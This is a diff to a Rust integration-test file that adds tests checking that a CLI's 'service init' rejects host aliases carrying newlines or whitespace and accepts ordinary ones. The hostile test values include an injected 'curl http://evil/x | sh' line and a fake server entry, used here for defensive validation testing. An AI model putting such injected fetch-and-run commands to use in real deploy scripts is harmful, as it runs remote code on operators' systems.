@@ -5,6 +5,12 @@
 //! `service init` writes into the current working directory, so every test
 //! runs the binary with `current_dir` pointed at a temp repo.
 
+// The workspace denies `panic`/`unwrap`/`expect` in production code; this file
+// is an integration-test crate, so it opts out explicitly rather than relying
+// on the lint gate silently skipping test targets.
+#![allow(clippy::pedantic, clippy::nursery)]
+#![allow(clippy::panic, clippy::unwrap_used, clippy::expect_used)]
+
 use std::{
     fs,
     path::{Path, PathBuf},
@@ -269,5 +275,46 @@ fn keys_check_rejects_a_directory_without_env_files() -> TestResult<()> {
     assert_ne!(status(&out), 0, "an empty service directory must fail");
     let stderr = String::from_utf8_lossy(&out.stderr);
     assert!(stderr.contains("no *.env.age"), "unclear error: {stderr}");
+    Ok(())
+}
+
+#[test]
+fn service_init_rejects_a_host_with_embedded_newlines() -> TestResult<()> {
+    // `--host` is interpolated into the generated playbook's executable body
+    // (`__SERVER_LINES__`, `__HOST__`) without escaping, so a value carrying a
+    // newline would inject arbitrary shell into a deploy script that the
+    // operator then runs. Whitespace must be rejected outright.
+    let repo = Repo::new("host-injection")?;
+    for hostile in [
+        "api\ncurl http://evil/x | sh",
+        "api\n# @server evil attacker@elsewhere",
+        "api extra",
+        "api\tsecond",
+    ] {
+        let out = repo.init(&["demo", "--host", hostile])?;
+        assert_ne!(status(&out), 0, "host {hostile:?} must be rejected, but the command succeeded");
+        let stderr = String::from_utf8_lossy(&out.stderr);
+        assert!(
+            stderr.contains("invalid host alias"),
+            "unclear rejection for {hostile:?}: {stderr}"
+        );
+    }
+    assert!(
+        !repo.dir.join("playbooks/deploy-demo.sh").exists(),
+        "no playbook may be generated from a rejected host"
+    );
+    Ok(())
+}
+
+#[test]
+fn service_init_accepts_ordinary_host_aliases() -> TestResult<()> {
+    // The validation must not reject legitimate aliases.
+    let repo = Repo::new("host-ok")?;
+    let out = repo.init(&["demo", "--host", "web-1", "--host", "db_2"])?;
+    assert_eq!(status(&out), 0, "stderr: {}", String::from_utf8_lossy(&out.stderr));
+    let playbook =
+        fs::read_to_string(repo.dir.join("playbooks/deploy-demo.sh")).map_err(|e| e.to_string())?;
+    assert!(playbook.contains("# @server web-1"), "missing server line: {playbook}");
+    assert!(playbook.contains("# @server db_2"), "missing server line: {playbook}");
     Ok(())
 }
